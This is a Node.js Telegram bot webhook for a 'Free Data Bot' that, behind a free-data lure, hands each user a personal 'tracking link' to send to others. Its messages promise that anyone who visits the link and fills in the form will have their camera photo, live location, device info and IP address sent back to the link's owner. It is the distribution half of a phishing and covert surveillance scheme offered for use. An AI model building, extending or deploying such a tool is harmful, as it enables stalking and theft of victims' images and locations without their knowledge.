const TelegramBot = require('node-telegram-bot-api');

// Bot token environment variable se le raha hai
const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBSITE_URL = process.env.WEBSITE_URL || 'https://free1gb.vercel.app';

// Bot initialize karo
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

module.exports = async (req, res) => {
  // Only POST requests allow karo
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const update = req.body;
    console.log('📨 Received update:', JSON.stringify(update));

    // /start command handle karo
    if (update.message && update.message.text === '/start') {
      const chatId = update.message.chat.id;
      const userId = update.message.from.id;
      const firstName = update.message.from.first_name || 'User';

      console.log(`👋 New user: ${firstName} (${userId})`);

      // Welcome message with buttons
      const keyboard = {
        inline_keyboard: [
          [
            { 
              text: "📢 Join Channel 1", 
              url: "https://t.me/sg_modder1" 
            },
            { 
              text: "📢 Join Channel 2", 
              url: "https://t.me/sg_modder1" 
            }
          ],
          [
            { 
              text: "✅ I Have Joined", 
              callback_data: "verify_join" 
            }
          ]
        ]
      };

      const welcomeMessage = 
        `🎉 *Welcome ${firstName} to Free Data Bot!* \n\n` +
        `*Get Your Personal Tracking Link:*\n` +
        `1. Join our channels above\n` +
        `2. Click "I Have Joined"\n` +
        `3. Get your personal link\n\n` +
        `🔗 *Share your link & get complete data when anyone visits!*`;

      await bot.sendMessage(chatId, welcomeMessage, {
        parse_mode: 'Markdown',
        reply_markup: keyboard
      });

      return res.status(200).json({ status: 'OK', action: 'welcome_sent' });
    }

    // Callback queries handle karo (button clicks)
    if (update.callback_query) {
      const query = update.callback_query;
      const chatId = query.message.chat.id;
      const userId = query.from.id;
      const firstName = query.from.first_name || 'User';

      console.log(`🔄 Callback from: ${firstName} (${userId}) - ${query.data}`);

      // Verify join button
      if (query.data === 'verify_join') {
        const personalLink = `${WEBSITE_URL}?id=${userId}`;
        
        const successMessage = 
          `✅ *Verification Complete, ${firstName}!* \n\n` +
          `🎯 *Your Personal Tracking Link:*\n` +
          `\`${personalLink}\`\n\n` +
          `📨 *How to use:*\n` +
          `• Send this link to anyone\n` +
          `• When they visit & fill form\n` +
          `• You get their complete data here!\n\n` +
          `📊 *You'll receive:*\n` +
          `• Camera photo 📸\n` +
          `• Live location 📍\n` +
          `• Device info 📱\n` +
          `• IP address 🌐\n\n` +
          `🔧 *Developed by Happy Bot* 🚀`;

        await bot.sendMessage(chatId, successMessage, {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔗 Copy Link", callback_data: "copy_link" }],
              [{ text: "🔄 New Link", callback_data: "new_link" }]
            ]
          }
        });
      }

      // Copy link button
      if (query.data === 'copy_link') {
        await bot.answerCallbackQuery(query.id, {
          text: "🔗 Link copied to clipboard!"
        });
      }

      // New link button
      if (query.data === 'new_link') {
        const newLink = `${WEBSITE_URL}?id=${userId}`;
        await bot.sendMessage(chatId, 
          `🔄 *New Link Generated!*\n\n\`${newLink}\``, 
          { parse_mode: 'Markdown' }
        );
      }

      // Always answer callback query
      await bot.answerCallbackQuery(query.id);
      
      return res.status(200).json({ status: 'OK', action: 'callback_handled' });
    }

    // Agar koi aur message aaye
    if (update.message) {
      const chatId = update.message.chat.id;
      await bot.sendMessage(chatId, 
        "🤖 *Free Data Bot*\n\nUse /start to get your personal tracking link!",
        { parse_mode: 'Markdown' }
      );
    }

    res.status(200).json({ status: 'OK' });

  } catch (error) {
    console.error('❌ Webhook error:', error);
    res.status(500).json({ 
      error: 'Internal server error',
      details: error.message 
    });
  }
};
